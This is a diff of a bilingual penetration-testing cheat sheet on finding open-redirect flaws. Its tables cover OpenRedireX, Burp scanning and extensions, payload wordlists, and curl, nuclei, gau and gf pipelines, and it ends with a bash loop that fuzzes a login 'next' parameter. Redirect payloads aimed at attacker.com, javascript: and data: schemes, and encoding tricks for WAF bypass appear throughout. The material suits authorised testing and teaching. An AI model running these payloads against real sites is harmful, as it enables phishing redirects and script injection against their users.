@@ -23,80 +23,62 @@ linked:
 
 ## OpenRedireX
 
-| **Función** | **Comando** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Repo | `git clone https://github.com/devanshbatham/OpenRedireX` | Python — fuzzer dedicado. |
-| Single URL | `python openredirex.py -u "https://target/login?next=" -p payloads.txt` | Test param. |
-| Multiple URLs | `python openredirex.py -l urls.txt -p payloads.txt` | Bulk. |
-| Built-in payloads | `payloads/redirect_payloads.txt` (300+ payloads) | Default list. |
-| Keyword replace | `FUZZ` keyword en URL → tool inserta payloads | Marker-based. |
-| Default keyword | If no `FUZZ`, tool prueba auto-detect param | Auto. |
-| Threads | `-c 50` concurrencia | Speed. |
-| Output verbose | `-v` flag | Debug. |
-| Combine con Burp | Proxy through Burp para inspect | `--proxy http://127.0.0.1:8080`. |
-| Output JSON | Custom flag | Reportable. |
-| Headers custom | Auth header etc | Authenticated. |
-| Pipe input | `cat urls.txt | python openredirex.py -p payloads.txt` | Pipe-friendly. |
+| `git clone https://github.com/devanshbatham/OpenRedireX && cd OpenRedireX` | Install fuzzer dedicado | Primera vez. |
+| `python openredirex.py -u "https://target/login?next=FUZZ" -p payloads/payloads.txt` | Fuzz single URL | Endpoint con redirect param conocido. |
+| `python openredirex.py -l urls.txt -p payloads.txt` | Bulk over multiple URLs | Recon a escala. |
+| `python openredirex.py -u "..." -p payloads.txt -c 50` | 50 threads concurrentes | Speed up. |
+| `cat urls.txt \| python openredirex.py -p payloads.txt` | Pipe-friendly | Stdin chaining. |
+| `python openredirex.py -u "..." -p payloads.txt --proxy http://127.0.0.1:8080` | Proxy through Burp | Inspection. |
+| `python openredirex.py -u "..." -p payloads.txt -H "Cookie: session=$T"` | Authenticated fuzz | Endpoint detrás de auth. |
 ^or-tool-openredirex
 
 ___
 
 ## Burp Active Scanner + Param Miner
 
-| **Función** | **Acción** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Burp Pro Active Scan | Right-click request → "Do active scan" | Built-in. |
-| Burp BCheck rules | OR-specific BChecks (Burp Pro 2024+) | Modern detection. |
-| Param Miner unkeyed inputs | Detect headers que afectan redirect | `X-Forwarded-Host` etc. |
-| Reflection panel | Identifica reflejos de input en response | Pre-detection. |
-| Repeater + manual fuzz | Test payloads manualmente | Fine-grained. |
-| Intruder con payload set | Carga `redirect_payloads.txt` | Bulk fuzz. |
-| Hackvertor | Encoding payloads dynamically | Bypass evasion. |
-| ZAP scanner | OWASP ZAP free alternative | OR detection rule. |
-| Logger++ | Filter responses por status 30x | Visual. |
-| Comparer | Diff entre redirects | Validate behavior. |
+| Burp → Right-click request → "Do active scan" | Active scan con OR detection built-in | Burp Pro available. |
+| Burp → BApp Store → "Param Miner" → Right-click → "Guess headers" | Detecta headers unkeyed que afectan redirect | Cache poisoning combo. |
+| Burp → BApp Store → "Reflection" → install | Identificar reflejos de input | Pre-attack discovery. |
+| Burp → Repeater → modificar `next=` con payloads manualmente | Manual fuzz + observe behavior | Fine-grained testing. |
+| Burp → Intruder → payload set "Open redirect" o load `payloads.txt` | Bulk fuzz con payload set | Volume testing. |
+| Burp → BApp Store → "Hackvertor" → wrap payloads encoded | Encoding dynamic | WAF bypass. |
+| Burp → Logger++ → filter `response.status >= 300 && response.status < 400` | Solo respuestas 3xx | Visual review redirects. |
 ^or-tool-burp
 
 ___
 
-## Wordlists (PayloadsAllTheThings + extras)
+## Wordlists
 
-| **Wordlist** | **Path** | **Uso** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| PayloadsAllTheThings - Open Redirect | `PayloadsAllTheThings/Open Redirect/` | Classic + bypasses. |
-| OpenRedireX default | `OpenRedireX/payloads/redirect_payloads.txt` | 300+ entries. |
-| SecLists - URL Redirect | `SecLists/Fuzzing/URLs-and-paths-fuzz.txt` | Path fuzzing. |
-| Custom polyglot | One payload, multiple bypasses combined | Single-shot. |
-| `https://attacker.com` baseline | Simple test | Quick check. |
-| `//attacker.com` baseline | Protocol-relative | Common bypass. |
-| `\\\\attacker.com` baseline | Backslash | Browser quirks. |
-| `https://target.com.attacker.com` | Suffix bypass | Whitelist defeat. |
-| `https://target.com@attacker.com` | Userinfo trick | Parser confusion. |
-| `javascript:alert(1)` | XSS combo | Scheme. |
-| `data:text/html,<script>...` | data URL | Same. |
-| `https%3A%2F%2Fattacker.com` | URL-encoded | Encoding. |
-| `xn--ttacker-...` | Punycode | IDN spoofing. |
-| Burp Intruder builtin | "Open redirect (extended)" payload set | Pro feature. |
+| `git clone https://github.com/swisskyrepo/PayloadsAllTheThings && ls "PayloadsAllTheThings/Open Redirect/"` | PayloadsAllTheThings OR list | Foundation. |
+| `wget https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Open%20Redirect/Open%20Redirect%20payloads.txt` | Wordlist ready | Quick download. |
+| `cat /usr/share/seclists/Fuzzing/URLs-and-paths-fuzz.txt` | SecLists URLs | Path fuzzing combo. |
+| `git clone https://github.com/devanshbatham/OpenRedireX && cat OpenRedireX/payloads/payloads.txt` | OpenRedireX 300+ payloads | Pre-curated. |
+| `wget https://raw.githubusercontent.com/cujanovic/Open-Redirect-Payloads/master/Open-Redirect-payloads.txt` | Cujanovic wordlist | Alternative comprehensive. |
+| `cat custom.txt PayloadsAllTheThings.txt OpenRedireX.txt \| sort -u > combined.txt` | Combined deduplicado | Bulk fuzz custom. |
 ^or-tool-wordlists
 
 ___
 
 ## Manual curl / Custom Scripts
 
-| **Function** | **Command** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Test single payload | `curl -sI "https://target/login?next=https://attacker.com" | grep -i location` | Quick check. |
-| Loop over payloads | `for p in $(cat payloads.txt); do curl -sI "https://target/login?next=$p" | grep -i location; done` | Bulk. |
-| Extract Location header | `curl -sI ... | awk -F': ' '/^[Ll]ocation:/{print $2}'` | Parse. |
-| Detect meta refresh | `curl -s ... | grep -oE '<meta[^>]*refresh[^>]*>'` | HTML-based. |
-| Detect JS redirect | `curl -s ... | grep -oE 'location\s*[=.][^;]*'` | Client-side. |
-| Validate redirect target | `final=$(curl -sLo /dev/null -w '%{url_effective}' ...)` | Follow + final URL. |
-| Headers + body análisis | `curl -i ... | tee response.txt` | Save full. |
-| Custom Python script | `requests.get(url, allow_redirects=False).headers['Location']` | Programmable. |
-| Async batch test | `aiohttp` async scan | Speed. |
-| nuclei templates | `nuclei -t open-redirect.yaml -u target` | Curated rule. |
-| `gau` + filter URLs | Get archived URLs + filter for redirect params | Wayback. |
-| `gf` patterns | `gf redirect` filter URLs from history | Single-grep. |
+| `curl -sI "https://target/login?next=https://attacker.com" \| grep -i location` | Quick single test | Manual sanity check. |
+| `for p in $(cat payloads.txt); do ENC=$(jq -sRr @uri <<<"$p"); curl -sI "https://target/login?next=$ENC" \| grep -i location; done` | Bulk shell loop | Sin tools dedicadas. |
+| `curl -sI "..." \| awk -F': ' '/^[Ll]ocation:/{print $2}'` | Parse Location header limpio | Pipe-friendly extraction. |
+| `curl -s "..." \| grep -oE '<meta[^>]*refresh[^>]*>'` | Detectar meta refresh | Server-side OR via meta. |
+| `curl -s "..." \| grep -oE 'location\s*[=.][^;]*'` | Detectar JS-based redirect | Client-side OR. |
+| `curl -sLo /dev/null -w '%{url_effective}\n' "..."` | Follow redirects → final URL | Validate target final. |
+| `nuclei -u target -t http/vulnerabilities/generic/open-redirect.yaml` | Templates curados | Auto-detection rápido. |
+| `gau target.com \| grep -E 'redirect\|next\|return\|url=\|goto'` | URLs históricas con redirect params | Wayback recon. |
+| `gf redirect < urls.txt` | Filter patterns con `gf` | Pattern-based filtering. |
+| `cat urls.txt \| gf redirect \| qsreplace 'https://attacker.com' \| while read u; do curl -sI "$u" \| grep -i location; done` | Pipeline completo Wayback → fuzz | Full automation. |
 ^or-tool-manual
 
 ### Bash one-liner test
@@ -111,13 +93,15 @@ PAYLOADS=(
   'javascript:alert(1)'
   'https%3A%2F%2Fattacker.com'
   '%2F%2Fattacker.com'
+  'https://attacker.com#@target.com'
+  'https://target.com\@attacker.com'
 )
 
 for p in "${PAYLOADS[@]}"; do
   ENCODED=$(printf '%s' "$p" | jq -sRr @uri)
   RESULT=$(curl -sI "https://target.com/login?next=$ENCODED" | grep -i 'location:' | head -1)
-  if echo "$RESULT" | grep -qE 'attacker|alert'; then
-    echo "[!] $p → $RESULT"
+  if echo "$RESULT" | grep -qiE 'attacker|alert'; then
+    echo "[!] VULN: $p → $RESULT"
   fi
 done
 ```
